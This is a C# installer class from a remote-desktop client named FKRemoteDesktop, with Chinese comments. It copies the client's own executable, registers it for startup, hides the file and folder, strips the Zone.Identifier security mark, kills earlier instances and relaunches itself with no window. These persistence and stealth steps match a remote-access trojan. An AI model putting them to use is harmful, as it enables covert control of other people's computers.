using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Extensions;
using FKRemoteDesktop.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Install
{
    public class ClientInstaller : ClientSetupBase
    {
        public void ApplySettings()
        {
            if (SettingsFromServer.STARTUP)
            {
                Logger.Log(ELogType.eLogType_Info, "添加客户端到开机自启动.");
                var clientStartup = new ClientStartup();
                clientStartup.AddToStartup(SettingsFromClient.INSTALLPATH, SettingsFromClient.STARTUPKEY);
            }
            else
            {
                Logger.Log(ELogType.eLogType_Warning, "客户端未开启开机自启动机制.");
            }

            if (SettingsFromServer.INSTALL)
            {
                try
                {
                    Logger.Log(ELogType.eLogType_Debug, "设置客户端文件为不可见.");
                    File.SetAttributes(SettingsFromClient.INSTALLPATH, FileAttributes.Hidden);
                }
                catch (Exception) { }
            }
            else
            {
                Logger.Log(ELogType.eLogType_Warning, "客户端未开启安全备份机制.");
            }

            if (SettingsFromServer.INSTALL && !string.IsNullOrEmpty(SettingsFromClient.SUBDIRECTORY))
            {
                try
                {
                    Logger.Log(ELogType.eLogType_Debug, "设置客户端文件夹为不可见.");
                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(SettingsFromClient.INSTALLPATH));
                    di.Attributes |= FileAttributes.Hidden;
                }
                catch (Exception) { }
            }
        }

        public void Install()
        {
            // 创建目标文件夹
            if (!Directory.Exists(Path.GetDirectoryName(SettingsFromClient.INSTALLPATH)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(SettingsFromClient.INSTALLPATH));
            }

            // 删除已存在文件
            if (File.Exists(SettingsFromClient.INSTALLPATH))
            {
                try
                {
                    File.Delete(SettingsFromClient.INSTALLPATH);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // 删除先前的进程
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(SettingsFromClient.INSTALLPATH));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            // 不要杀掉自己的进程
                            if (prc.Id == myPid)
                                continue;
                            // 仅仅杀掉目标路径的进程
                            if (prc.GetMainModuleFileName() != SettingsFromClient.INSTALLPATH)
                                continue;
                            prc.Kill();
                            Thread.Sleep(2000);
                            break;
                        }
                    }
                }
            }

            try
            {
                File.Copy(Application.ExecutablePath, SettingsFromClient.INSTALLPATH, true);
            }
            catch { }   // 这里不处理错误，因为Windows会因延迟而错误报错
            ApplySettings();
            FileHelper.DeleteZoneIdentifier(SettingsFromClient.INSTALLPATH);

            // 自己重新启动
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = SettingsFromClient.INSTALLPATH
            };
            ProcessHelper.StartProcess(startInfo);
        }
    }
}